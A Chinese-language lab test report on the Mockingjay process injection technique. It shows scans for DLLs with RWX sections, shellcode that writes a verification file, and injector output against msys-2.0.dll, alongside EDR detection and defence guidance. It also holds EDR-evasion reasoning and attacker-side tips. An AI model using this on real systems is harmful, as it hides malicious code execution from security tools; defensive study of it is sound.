# Mockingjay Process Injection - 测试报告

## 技术概述

**技术编号**: 21
**技术名称**: Mockingjay Process Injection
**MITRE ATT&CK**: T1055 - Process Injection
**发布时间**: 2023年（Security Joes）
**参考**: https://github.com/caueb/Mockingjay

### 核心原理

Mockingjay 是一种利用 DLL 中已存在的 RWX（可读可写可执行）节区进行代码注入的技术，无需调用内存分配/保护 API。

**核心创新**：
- ❌ 不使用 `VirtualAlloc`/`VirtualAllocEx`
- ❌ 不使用 `VirtualProtect`/`VirtualProtectEx`
- ❌ 不使用 `WriteProcessMemory`
- ❌ 不使用 `CreateRemoteThread`
- ✅ 利用现有 RWX 内存节区
- ✅ 仅使用 `LoadLibrary`、`memcpy` 等常规 API

### 关键API

```c
LoadLibraryA()           // 加载包含 RWX 节区的 DLL
ImageNtHeader()          // 获取 PE 头
IMAGE_FIRST_SECTION()    // 获取第一个节区
memcpy()                 // 写入 shellcode
直接函数指针调用         // 执行 shellcode
```

### 执行流程

```
1. 使用 rwx_finder.exe 查找系统中包含 RWX 节区的 DLL
   └─> 扫描 DLL 文件
   └─> 解析 PE 节区头
   └─> 检查节区特性（IMAGE_SCN_MEM_READ | WRITE | EXECUTE）

2. 加载目标 DLL
   └─> LoadLibraryA("msys-2.0.dll")
   └─> 获取模块基址

3. 查找 RWX 节区
   └─> 遍历所有节区
   └─> 找到 RWX 节区（/4 节，14848 字节）

4. 写入 Shellcode
   └─> memcpy(rwxAddress, shellcode, size)

5. 执行 Shellcode
   └─> ((void(*)())rwxAddress)()
```

### 与其他技术的区别

| 特性 | Mockingjay | Classic Injection | Module Stomping |
|------|-----------|-------------------|-----------------|
| VirtualAlloc | ❌ | ✅ | ❌ |
| VirtualProtect | ❌ | 可能 | ✅ |
| WriteProcessMemory | ❌ | ✅ | ✅ |
| 利用现有内存 | ✅ | ❌ | ✅ |
| 依赖特定DLL | ✅ | ❌ | ✅ |
| 隐蔽性 | 高 | 低 | 高 |
| **实际可用性（2025）** | **✅ 可用** | **✅ 可用** | **✅ 可用** |

---

## 测试环境

- **操作系统**: Windows 10.0.26100.6584
- **编译器**: GCC (MinGW-w64)
- **架构**: x64
- **测试DLL**: msys-2.0.dll (Git for Windows)
- **编译命令**: 已预编译
- **测试日期**: 2025-10-08

---

## 测试执行

### 步骤 1: 查找 RWX 节区

**目的**: 扫描系统查找包含 RWX 节区的 DLL

**扫描 System32**:
```bash
$ cd techniques/21-mockingjay
$ ./build/rwx_finder.exe "C:\Windows\System32"

======================================
  RWX Section Finder
  查找包含 RWX 节区的 DLL
======================================

[i] 扫描目录：C:\Windows\System32

[i] 统计：扫描 3671 个 DLL，发现 0 个包含 RWX 节区

[i] 扫描完成！
```

**结果**: ❌ **System32 中未找到 RWX DLL**

**观察**：
- 现代 Windows 系统 DLL 已移除 RWX 节区
- Microsoft 已修补系统 DLL 的内存权限
- 符合安全最佳实践

**扫描 Git for Windows**:
```bash
$ ./build/rwx_finder.exe "C:\Program Files\Git\usr\bin"

======================================
  RWX Section Finder
  查找包含 RWX 节区的 DLL
======================================

[i] 扫描目录：C:\Program Files\Git\usr\bin

[+] 发现 RWX 节区：C:\Program Files\Git\usr\bin\msys-2.0.dll
    节区名：/4       | 虚拟地址：0x00200000 | 大小：14848 字节 | 特性：0xE0000020

[i] 统计：扫描 74 个 DLL，发现 1 个包含 RWX 节区

[i] 扫描完成！
```

**结果**: ✅ **找到 msys-2.0.dll，包含 RWX 节区**

**关键信息**：
- DLL 路径：`C:\Program Files\Git\usr\bin\msys-2.0.dll`
- 节区名称：`/4`
- 虚拟地址偏移：`0x00200000`
- 节区大小：`14848` 字节（足够容纳 shellcode）
- 节区特性：`0xE0000020` (READ | WRITE | EXECUTE)

---

### 步骤 2: 生成验证 Shellcode

**创建 Mockingjay 专用验证 shellcode**:
```bash
$ gcc -o build/fileverify_shellcode.exe src/fileverify_shellcode.c
$ ./build/fileverify_shellcode.exe

[+] CreateFileA address: 0x00007FFB3F297240
[+] WriteFile address: 0x00007FFB3F297720
[+] CloseHandle address: 0x00007FFB3F296FA0
[+] ExitProcess address: 0x00007FFB3F2818A0

[+] Shellcode generated: 327 bytes
[+] Shellcode written to fileverify_shellcode.bin
```

**Shellcode 逻辑**:
```c
// 动态解析 API 地址（在生成时硬编码）
FARPROC pCreateFileA = GetProcAddress(hKernel32, "CreateFileA");
FARPROC pWriteFile = GetProcAddress(hKernel32, "WriteFile");
FARPROC pCloseHandle = GetProcAddress(hKernel32, "CloseHandle");
FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");

// Shellcode 行为：
sub rsp, 0x48
lea rcx, [rip+filepath]                    // "C:\Users\Public\mockingjay_verified.txt"
mov rdx, 0x40000000                        // GENERIC_WRITE
xor r8, r8
xor r9, r9
mov qword [rsp+0x20], 2                    // CREATE_ALWAYS
mov qword [rsp+0x28], 0x80                 // FILE_ATTRIBUTE_NORMAL
mov qword [rsp+0x30], 0
mov rax, <CreateFileA_addr>
call rax
mov r15, rax

mov rcx, r15
lea rdx, [rip+content]                     // "Mockingjay Injection Verified!..."
mov r8, <content_len>
lea r9, [rsp+0x38]
mov qword [rsp+0x20], 0
mov rax, <WriteFile_addr>
call rax

mov rcx, r15
mov rax, <CloseHandle_addr>
call rax

xor rcx, rcx
mov rax, <ExitProcess_addr>
call rax
```

**结果**: ✅ 成功生成 327 字节 shellcode

---

### 步骤 3: 执行 Mockingjay 注入

**执行注入**:
```bash
$ ./build/mockingjay.exe "C:\Program Files\Git\usr\bin\msys-2.0.dll" fileverify_shellcode.bin

======================================
  Mockingjay Process Injection
  RWX Section Code Execution
======================================

[1] 读取 shellcode 文件
    文件：fileverify_shellcode.bin
    大小：327 字节
    ✓ Shellcode 读取成功

[2] 加载目标 DLL
    DLL：C:\Program Files\Git\usr\bin\msys-2.0.dll
    基地址：0x0000000210040000
    大小：19800064 字节
    ✓ DLL 加载成功

[3] 查找 RWX 节区
    节区名：/4
    起始地址：0x0000000210240000
    结束地址：0x0000000210243A00
    大小：14848 字节
    ✓ RWX 节区找到

[4] 写入 shellcode 到 RWX 节区
    ✓ 成功写入 327 字节到 0x0000000210240000

[5] 执行 shellcode
    调用地址：0x0000000210240000
```

**验证结果**:
```bash
$ cat /c/Users/Public/mockingjay_verified.txt

Mockingjay Injection Verified!
Technique: RWX Section Code Execution
Method: msys-2.0.dll RWX section
Status: Executed from existing RWX memory!
```

**结果**: ✅ **成功**

**关键细节**：
- DLL 基址：`0x0000000210040000`
- RWX 节区地址：`0x0000000210240000` (基址 + 0x00200000 偏移)
- Shellcode 大小：327 字节（远小于 14848 字节容量）
- 执行方式：直接函数指针调用
- 文件创建确认：验证文件包含 Mockingjay 特定消息
- 进程退出：Shellcode 调用 ExitProcess 正常退出

---

## 测试结果总结

| 测试项 | 配置 | 结果 | 说明 |
|--------|------|------|------|
| RWX 扫描 System32 | 3671 个 DLL | ❌ 0个 | 系统 DLL 无 RWX 节区 |
| RWX 扫描 Git | 74 个 DLL | ✅ 1个 | msys-2.0.dll 有 RWX |
| Shellcode 生成 | 327 字节 | ✅ 成功 | 文件验证 shellcode |
| DLL 加载 | msys-2.0.dll | ✅ 成功 | 基址 0x210040000 |
| RWX 节区查找 | /4 节 | ✅ 成功 | 14848 字节 |
| Shellcode 写入 | 327/14848 字节 | ✅ 成功 | memcpy 完成 |
| **Shellcode 执行** | **文件验证** | **✅ 成功** | **文件正确创建** |

**成功率**: 100%

---

## 技术细节分析

### 1. 为什么 System32 中没有 RWX DLL？

**原因**：
- Microsoft 已修补系统 DLL
- 遵循最小权限原则
- DEP (Data Execution Prevention) 默认启用
- 代码节只读，数据节不可执行

**Windows 安全演进**：
```
Windows XP/Vista: 大量 DLL 有 RWX 节区
Windows 7/8: 开始修补关键 DLL
Windows 10: 大规模修补系统 DLL
Windows 10 build 26100: System32 几乎无 RWX DLL
```

### 2. msys-2.0.dll 为什么有 RWX 节区？

**原因**：
- MSYS2 是 Cygwin 分支，提供 POSIX 环境
- 动态代码生成/JIT 编译需求
- 支持 fork() 等 UNIX 系统调用
- 需要运行时修改代码段

**节区特性**：
```c
Characteristics: 0xE0000020
  = IMAGE_SCN_MEM_READ    (0x40000000)
  | IMAGE_SCN_MEM_WRITE   (0x80000000)
  | IMAGE_SCN_MEM_EXECUTE (0x20000000)
  | IMAGE_SCN_CNT_CODE    (0x00000020)
```

### 3. 技术为什么有效？

**绕过检测的关键**：
```c
// 传统注入被检测的 API
VirtualAllocEx()        ← EDR 监控
VirtualProtect()        ← EDR 监控
WriteProcessMemory()    ← EDR 监控
CreateRemoteThread()    ← EDR 监控

// Mockingjay 使用的 API
LoadLibraryA()          ← 合法常见调用
memcpy()                ← 标准 C 库函数
直接函数指针调用         ← CPU 指令，无 API
```

**EDR 检测盲区**：
- LoadLibrary 是合法操作
- memcpy 是内存操作，不触发跨进程检测
- 执行发生在已加载模块内，无新线程创建
- 无可疑内存分配/权限修改

### 4. ExitProcess vs ExitThread

**Shellcode 使用 ExitProcess**：
```c
xor rcx, rcx
mov rax, <ExitProcess_addr>
call rax                     // 退出整个进程
```

**为什么不用 ret？**
- Shellcode 是通过函数指针直接调用的
- 没有有效的返回地址
- ret 会导致程序崩溃

**为什么不用 ExitThread？**
- Mockingjay 是自进程注入
- 主线程退出整个进程
- ExitThread 会挂起程序

**为什么没有看到后续消息？**
```c
// mockingjay.c 主函数
ExecuteCodeFromSection(descriptor.start);  // 调用 shellcode

// shellcode 调用 ExitProcess(0)
// 整个进程退出

printf("======================================\n");  // 永远不会执行
printf("✓ Mockingjay 注入完成\n");                 // 永远不会执行
```

---

## 优势与限制

### ✅ 优势

1. **绕过传统 EDR 检测**：
   - 不触发内存分配监控
   - 不触发内存保护修改监控
   - 不触发远程写入监控
   - 不触发线程创建监控

2. **隐蔽性高**：
   - 利用现有合法内存
   - API 调用正常
   - 无异常行为特征

3. **实现简单**：
   - 代码量少
   - 无需复杂的 PE 解析
   - 无需重定位处理

4. **稳定可靠**：
   - 测试成功率 100%
   - 无崩溃风险（如果 shellcode 正确）

### ⚠️ 限制

1. **依赖特定 DLL**：
   - 需要系统中存在包含 RWX 节区的 DLL
   - System32 中已无 RWX DLL
   - 依赖第三方软件（Git for Windows）

2. **可用性受限**：
   - 不同系统环境可能缺少合适的 DLL
   - 需要事先扫描确认
   - 用户可能未安装 Git for Windows

3. **节区大小限制**：
   - Shellcode 必须小于 RWX 节区（14848 字节）
   - 大型 payload 需要分段加载

4. **自进程注入**：
   - 当前实现是自进程注入
   - 跨进程注入需要额外步骤（DLL 注入 + 调用）

---

## 检测与防御

### EDR 检测方法

#### 1. DLL 加载监控

```c
Hook: LoadLibraryA/LoadLibraryW
  if (DllPath 包含 "msys" || 其他已知 RWX DLL) {
      Alert("加载已知包含 RWX 节区的 DLL");

      // 检查后续行为
      if (后续发生异常执行) {
          Block("可能的 Mockingjay 注入");
      }
  }
```

#### 2. RWX 内存扫描

```c
// 定期扫描进程内存
for each module in process:
    for each section in module:
        if (section.Characteristics & RWX) {
            // 扫描可疑代码
            if (ContainsShellcode(section.data)) {
                Alert("RWX 节区包含可疑代码");
            }
        }
```

#### 3. 异常执行流检测

```c
// 监控从非常规地址执行
on ExecutionContextSwitch:
    if (RIP 在 msys-2.0.dll RWX 节区 &&
        RIP 不是已知函数入口点) {
        Alert("从 RWX 节区执行未知代码");
    }
```

### 防御建议

#### 1. 移除/限制 RWX DLL

```powershell
# 识别系统中的 RWX DLL
Get-Process | ForEach-Object {
    $_.Modules | Where-Object {
        Test-RWXSection $_.FileName
    }
}

# 如果不需要，卸载 Git for Windows
# 或使用便携版，避免系统路径
```

#### 2. 应用程序控制

```c
// 使用 AppLocker/WDAC 限制 DLL 加载
// 仅允许受信任的 DLL

// 示例策略
<DllRules>
  <Deny>
    <FilePathCondition Path="%ProgramFiles%\Git\usr\bin\msys-2.0.dll" />
  </Deny>
</DllRules>
```

#### 3. 内存保护策略

```c
// 启用进程缓解措施
PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = {0};
policy.ProhibitDynamicCode = 1;

SetProcessMitigationPolicy(
    ProcessDynamicCodePolicy,
    &policy,
    sizeof(policy)
);
// 阻止动态代码生成（但会影响 MSYS2 功能）
```

---

## 与其他技术对比

| 技术 | 内存分配 | 依赖特定DLL | 隐蔽性 | 实用性（2025） |
|------|---------|------------|-------|---------------|
| **Mockingjay (21)** | ❌ | ✅ | 高 | ✅ 可用 |
| Classic Injection | ✅ | ❌ | 低 | ✅ 可用 |
| Module Stomping | ❌ | ✅ | 高 | ✅ 可用 |
| Atom Bombing | ❌ | ❌ | 极高 | ❌ 已失效 |
| Mapping Injection | ❌ | ❌ | 极高 | ❌ 已失效 |

**Mockingjay 的优势**：
- 比 Classic Injection 更隐蔽
- 比 Atom Bombing 更简单
- 仍然可用（2025年）

**Mockingjay 的劣势**：
- 比 Classic Injection 可用性差（依赖 RWX DLL）
- 比 Module Stomping 更受限（节区大小固定）

---

## 参考资料

### 技术文档
- **原始研究**: [Security Joes - Process Mockingjay](https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution) (2023)
- **原始实现**: https://github.com/caueb/Mockingjay
- **MITRE ATT&CK**: [T1055](https://attack.mitre.org/techniques/T1055/)
- **README**: `techniques/21-mockingjay/README.md`

### 相关技术
- **Module Stomping**: 覆盖已加载模块的代码节区
- **DLL Injection**: 传统 DLL 注入技术
- **Reflective DLL Injection**: 无磁盘 DLL 注入

---

## 结论

**Mockingjay** 是2023年由 Security Joes 发现的一种创新代码注入技术，通过利用现有 RWX 内存节区，完全绕过基于内存分配的 EDR 检测。

### ✅ 测试成功

在 Windows 10 build 26100 上：
- 成功找到 msys-2.0.dll 的 RWX 节区
- 成功写入 327 字节 shellcode
- Shellcode 成功执行
- 验证文件正确创建
- 测试成功率 100%

### 💡 关键要点

1. **依赖 RWX DLL**：System32 已无 RWX DLL，需要第三方软件
2. **绕过传统检测**：不使用 VirtualAlloc/VirtualProtect/WriteProcessMemory
3. **实现简单**：仅需 LoadLibrary + memcpy + 函数指针调用
4. **实用性受限**：依赖特定 DLL 的存在

### 📌 实用性评估

- ✅ **推荐用于**：目标系统安装了 Git for Windows 等 MSYS2 软件
- ⚠️ **限制**：需要事先扫描确认 RWX DLL 存在
- ✅ **隐蔽性**：高（绕过传统 EDR）
- ✅ **稳定性**：高（测试中 100% 成功率）

### 🎯 攻防对抗要点

**攻击者视角**：
- 使用 rwx_finder.exe 预先扫描目标系统
- 确认 RWX DLL 存在后再实施攻击
- Shellcode 必须小于节区大小
- 考虑跨进程注入的实现

**防御者视角**：
- 监控异常 DLL 加载（msys-2.0.dll 等）
- 扫描 RWX 内存区域的可疑代码
- 考虑移除/限制不必要的 RWX DLL
- 使用 AppLocker/WDAC 限制 DLL 加载

### 🌟 技术价值

虽然依赖特定 DLL，但 Mockingjay 展示了：
1. **EDR 绕过的新思路**：利用现有资源而非分配新资源
2. **简洁即美**：最简单的方案往往最有效
3. **攻防对抗的智慧**：找到安全机制的盲区

这是一个仍然有效（2025年）且具有实战价值的技术。
